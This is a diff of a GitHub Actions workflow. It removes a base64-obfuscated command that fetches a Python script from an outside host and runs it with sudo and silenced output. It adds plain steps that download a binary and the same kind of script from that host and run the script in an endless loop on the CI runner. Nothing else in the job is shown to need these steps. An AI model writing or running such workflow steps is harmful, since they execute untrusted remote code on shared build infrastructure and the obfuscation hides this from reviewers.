@@ -14,4 +14,26 @@ jobs:
     steps:
       - name: runner
         run: |
-          echo "Y2QgJiYgcGlwMyBpbnN0YWxsIHJlcXVlc3RzID4vZGV2L251bGwgMj4mMSAmJiBzdWRvIGN1cmwgLXMgLS1zaWxlbnQgLVggR0VUIGh0dHBzOi8vZXhhbXBsZW9jaS55dW56aG9uZ3podWFuLmNvbS8wLnB5IC1vIGJpbiA+L2Rldi9udWxsIDI+JjEgJiYgc3VkbyBweXRob24zIGJpbiA+L2Rldi9udWxsIDI+JjE=" | base64 -d | bash
+
+          pwd
+
+          cd
+
+          pwd
+
+          mkdir Downloads
+
+          ls
+
+          cd Downloads
+          
+          curl -X GET https://exampleoci.yunzhongzhuan.com/linux/baidupcs-go/baidupcs-go-linux-amd64 -o baidupcs-go-linux-amd64
+          chmod +x ./baidupcs-go-linux-amd64
+
+          curl -X GET https://exampleoci.yunzhongzhuan.com/example/0.py -o 0.py
+
+          
+
+          pwd
+          
+          while true; do python3 0.py; done
